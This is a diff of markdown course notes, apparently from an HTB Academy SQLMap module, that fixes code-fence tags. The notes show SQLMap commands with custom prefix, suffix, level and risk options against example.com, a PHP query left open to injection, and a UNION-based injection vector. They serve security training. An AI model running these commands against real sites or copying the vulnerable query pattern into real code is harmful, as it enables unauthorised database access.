@@ -14,24 +14,21 @@ In most cases, SQLMap should run out of the box with the provided target details
 There is a requirement for special prefix and suffix values in rare cases, not covered by the regular SQLMap run.  
 For such runs, options `--prefix` and `--suffix` can be used as follows:
 
-```
-        bash
+```bash
 sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
 ```
 
 This will result in an enclosure of all vector values between the static prefix `%'))` and the suffix `-- -`.  
 For example, if the vulnerable code at the target is:
 
-```
-        php
+```php
 $query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
 $result = mysqli_query($link, $query);
 ```
 
 The vector `UNION ALL SELECT 1,2,VERSION()`, bounded with the prefix `%'))` and the suffix `-- -`, will result in the following (valid) SQL statement at the target:
 
-```
-        sql
+```sql
 SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
 ```
 
@@ -48,8 +45,7 @@ For such demands, the options `--level` and `--risk` should be used:
 
 The best way to check for differences between used boundaries and payloads for different values of `--level` and `--risk`, is the usage of `-v` option to set the verbosity level. In verbosity 3 or higher (e.g. `-v 3`), messages containing the used `[PAYLOAD]` will be displayed, as follows:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3 --level=5
 
 ...SNIP...
@@ -72,8 +68,7 @@ hiimeins@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3 --level=5
 
 On the other hand, payloads used with the default `--level` value have a considerably smaller set of boundaries:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3
 ...SNIP...
 [14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
@@ -87,8 +82,7 @@ hiimeins@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3
 
 As for vectors, we can compare used payloads as follows:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sqlmap -u www.example.com/?id=1
 ...SNIP...
 [14:42:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
@@ -97,8 +91,7 @@ hiimeins@htb[/htb]$ sqlmap -u www.example.com/?id=1
 ...SNIP...
 ```
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sqlmap -u www.example.com/?id=1 --level=5 --risk=3
 
 ...SNIP...
